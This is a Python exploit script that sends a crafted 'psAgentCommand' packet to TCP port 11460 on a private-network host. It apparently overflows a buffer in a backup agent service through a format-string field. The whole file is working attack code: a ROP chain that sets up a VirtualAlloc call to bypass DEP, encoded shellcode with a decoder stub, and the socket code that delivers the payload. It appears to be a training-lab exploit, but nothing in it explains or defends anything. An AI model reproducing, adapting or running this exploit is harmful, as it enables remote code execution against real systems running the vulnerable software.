import socket
import sys
from struct import pack

def shellcode():
	buf =  b"\x90" * 20
	buf += b"\xeb\x23\x5b\x89\xdf\xb0\xae\xfc\xae\x75\xfd\x89"
	buf += b"\xf9\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x49"
	buf += b"\x01\x74\x08\x46\x80\x3e\xae\x75\xee\xeb\xea\xff"
	buf += b"\xe1\xe8\xd8\xff\xff\xff\xd7\xae\x2b\x3f\x55\xd7"
	buf += b"\xd7\xd7\xb7\x5e\x32\xe6\x17\xb3\x5c\x87\xe7\x5c"
	buf += b"\x85\xdb\x5c\x85\xc3\x5c\xa5\xff\xd8\x60\x9d\xf1"
	buf += b"\xe6\x28\x7b\xeb\xb6\xab\xd5\xfb\xf7\x16\x18\xda"
	buf += b"\xd6\x10\x35\x25\x85\x80\x5c\x85\xc7\x5c\x9d\xeb"
	buf += b"\x5c\x9b\xc6\xaf\x34\x9f\xd6\x06\x86\x5c\x8e\xf7"
	buf += b"\xd6\x04\x5c\x9e\xcf\x34\xed\x9e\x5c\xe3\x5c\xd6"
	buf += b"\x01\xe6\x28\x7b\x16\x18\xda\xd6\x10\xef\x37\xa2"
	buf += b"\x21\xd4\xaa\x2f\xec\xaa\xf3\xa2\x33\x8f\x5c\x8f"
	buf += b"\xf3\xd6\x04\xb1\x5c\xdb\x9c\x5c\x8f\xcb\xd6\x04"
	buf += b"\x5c\xd3\x5c\xd6\x07\x5e\x93\xf3\xf3\x8c\x8c\xb6"
	buf += b"\x8e\x8d\x86\x28\x37\x88\x88\x8d\x5c\xc5\x3c\x5a"
	buf += b"\x8a\xbf\xe4\xe5\xd7\xd7\xbf\xa0\xa4\xe5\x88\x83"
	buf += b"\xbf\x9b\xa0\xf1\xd0\x28\x02\x6f\x47\xd6\xd7\xd7"
	buf += b"\xfe\x13\x83\x87\xbf\xfe\x57\xbc\xd7\x28\x02\x87"
	buf += b"\x87\x87\x87\x97\x87\x97\x87\xbf\x3d\xd8\x08\x37"
	buf += b"\x28\x02\x40\xbd\xd2\xbf\x17\x7f\xfa\x72\xbf\xd5"
	buf += b"\xd7\xc6\x8b\x5e\x31\xbd\xc7\x81\x80\xbf\x4e\x72"
	buf += b"\xa3\xb6\x28\x02\x52\x17\xa3\xdb\x28\x99\xdf\xa2"
	buf += b"\x3b\xbf\x27\x62\x75\x81\x28\x02\xbf\xb4\xba\xb3"
	buf += b"\xd7\x5e\x34\x80\x80\x80\xe6\x21\xbd\xc5\x8e\x81"
	buf += b"\x35\x2a\xb1\x10\x93\xf3\xeb\xd6\xd6\x5a\x93\xf3"
	buf += b"\xc7\x11\xd7\x93\x83\x87\x81\x81\x81\x91\x81\x99"
	buf += b"\x81\x81\x84\x81\xbf\xae\x1b\xe8\x51\x28\x02\x5e"
	buf += b"\x37\x99\x81\x91\x28\xe7\xbf\xdf\x50\xca\xb7\x28"
	buf += b"\x02\x6c\x37\xca\xfd\xdd\xbf\x71\x42\x6a\x4a\x28"
	buf += b"\x02\xeb\xd1\xab\xdd\x57\x2c\x37\xa2\xd2\x6c\x90"
	buf += b"\xc4\xa5\xb8\xbd\xd7\x84\x28\x02\x49\x01"

	return buf


# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x500)  # 1st memcpy: size field
buf += pack("<i", 0x0)    # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)    # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)


size = 0x400

offset = 276

eip = pack("<L", 0x100113dd) # push esp ; sub eax, 0x20 ; pop ebx ; ret  ;

# badchars \x00\x09\x0a\x0b\x0c\x0d\x20

IAT = 0x100252e0

# psCommandBuffer
va  = pack("<L", (0x10010104)) # dummy VirtualAlloc Address ,,, ROPNOP
va += pack("<L", (0x10010104)) # Shellcode Return Address ,,, ROPNOP
va += pack("<L", (0x47474747)) # # dummy Shellcode Address
va += pack("<L", (0x10010104)) # dummy dwSize ,,, ROPNOP
va += pack("<L", (0x49494949)) # # dummy flAllocationType ,,, mangled
va += pack("<L", (0x10010104)) # dummy flProtect ,,, ROPNOP


buffer = b"A" * (offset - len(va))
buffer += va
buffer += eip

gadgets = [
	# align EBX to the start of skeleton EBX := EBX - 1c to get 0x45454545

	0x10024554, # mov edx, ebx ; pop edi ; pop ebx ; pop esi ; ret  ;
	0x41414141, # dummy for pop edi
	0x41414141, # dummy for pop ebx
	0x41414141, # dummy for pop esi

	0x1001018e, # pop ebx ; ret  ;
	0xffffffe4, # -0x1C
	0x10016c9e, # add edx, ebx ; pop ebx ; retn 0x0010 ;
	0x41414141, # dummy for pop ebx
	0x10010104, # : ret  ROPNOP;
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010

	0x100189f2,	# mov eax, edx ; ret

	# set VirtualAllocStub IAT

	0x10012ca5, # pop eax ; ret
	IAT, 
	0x10015fee, # mov eax, dword [eax] ; ret  ;
	0x100202ce, # mov ecx, eax ; call dword [edx] ;
	0x1001e4c6, # mov dword [edx], ecx ; ret  ;

	# set return address :=  ecx + 0x110
	0x10020ff4, # push edx ; sar esi, 0xFFFFFFFF ; pop ecx ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;

	0x10012ca5, # pop eax ; ret  ; 
	0xfffffeb0, # -0x150
	0x10023779, # neg eax ; retn 0x0004 ;
	0x10010104, # : ret  ROPNOP;
	0x41414141, # retn 0x0004
	0x10012ef4, # add eax, ecx ; pop esi ; ret  ;
	0x41414141, # dummy for pop esi

	0x100202ce, # mov ecx, eax ; call dword [edx] ;   # ROPNOP address in skeleton
	0x1001e4c6, # mov dword [edx], ecx ; ret  ;

	# set lpAddress	ecx to be equal to return address

	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	
	0x1001e4c6, # mov dword [edx], ecx ; ret  ;

	# set dwSize = 0x01

	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;

	0x10011b04, # inc eax ; ret  ;

	0x100202ce, # mov ecx, eax ; call dword [edx] ;   # ROPNOP
	0x1001e4c6, # mov dword [edx], ecx ; ret  ;


	# set flAllocationType = 0x1000

	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;

	0x5053a0f5, # pop eax ; ret  ;	
	0xfffff001, # -(0x1000 - 1)
	0x10023779, # neg eax ; retn 0x0004 ;
	0x10010104, # : ret  ROPNOP;
	0x41414141, # retn 0x0004
	0x10011b04, # inc eax ; ret  ;

	0x10010199, # pop ecx ; ret  ;
	0x10010104, # mov ROPNOP address to ECX register
	0x1001e4c6, # mov dword [edx], ecx ; ret  ;

	0x100202ce, # mov ecx, eax ; call dword [edx] ;   # ROPNOP address in skeleton
	0x1001e4c6, # mov dword [edx], ecx ; ret  ;

	# set flProtect = 0x40

	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;
	0x10020322, # inc edx ; add al, 0x00 ; xor eax, eax ; ret  ;

	0x10011504, # add eax, 0x20 ; ret  ;
	0x10011504, # add eax, 0x20 ; ret  ;

	0x100202ce, # mov ecx, eax ; call dword [edx] ;   # ROPNOP address in skeleton
	0x1001e4c6, # mov dword [edx], ecx ; ret  ;

	# align ESP to point to VirtualAllocaStub address

	0x100189f2, # mov eax, edx ; ret  ;
	0x10010199, # pop ecx ; ret
	0xffffffe8, # -0x18
	0x10012ef4, # add eax, ecx ; pop esi ; ret  ;
	0x41414141, # dummy for pop esi

	0x100153b1, # push eax ; add dl, byte [eax] ; pop ebp ; ret  ;
	0x1001a555, # mov esp, ebp ; pop ebp ; ret  ;
]

for gadget in gadgets:
	buffer += pack("<L", gadget)

buffer += shellcode()

buffer += b"C" * (size - len(buffer))

# psCommandBuffer
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer,0,0,0,0)
buf += formatString

# Checksum
buf = pack(">i", len(buf)-4) + buf

def main():
	
	server = "192.168.135.10"
	port = 11460

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	s.send(buf)
	s.close()

	print("[+] Packet sent")
	sys.exit(0)


if __name__ == "__main__":
 	main()
